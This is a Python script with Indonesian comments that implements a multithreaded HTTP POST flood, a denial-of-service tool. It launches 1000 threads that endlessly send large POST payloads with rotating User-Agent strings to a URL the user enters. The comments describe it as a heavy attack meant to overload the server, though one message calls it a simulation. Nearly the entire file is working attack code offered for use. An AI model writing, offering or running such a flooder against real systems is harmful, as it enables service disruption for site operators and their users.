import requests
import threading
import time
import random
from urllib.parse import urlparse

# Konfigurasi serangan
THREAD_COUNT = 1000         # Sesuaikan dengan kemampuan komputer Anda
REQUEST_TIMEOUT = 0.5        # Timeout sangat singkat
DELAY_BETWEEN_REQUESTS = 0  # Tanpa delay agar beban maksimal

# User-Agent acak
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 EdgiOS/44.12.3 Mobile/15E148 Safari/604.1"
]

def random_user_agent():
    return random.choice(USER_AGENTS)

def attack(target_url):
    headers = {
        "User-Agent": random_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Data POST yang cukup besar untuk membebani server
    payload = {
        "query": "a" * 1024 * 10  # Kirim data besar untuk diproses
    }

    while True:
        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
            print(f"[+] Response code: {response.status_code}")
        except Exception as e:
            print("[-] Server overload atau tidak merespons")

def start_attack(target_url):
    parsed = urlparse(target_url)
    if not parsed.netloc:
        print("[-] URL target tidak valid")
        return

    print(f"\n[🔥] MEMULAI SERANGAN BERAT KE: {target_url}")
    print(f"[INFO] Jumlah thread aktif: {THREAD_COUNT}")
    print("[INFO] Tekan Ctrl+C untuk menghentikan simulasi\n")

    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=attack, args=(target_url,))
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Serangan dihentikan oleh pengguna.")

if __name__ == "__main__":
    target = input("Masukkan URL endpoint POST (contoh: http://localhost/login): ").strip()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    start_attack(target)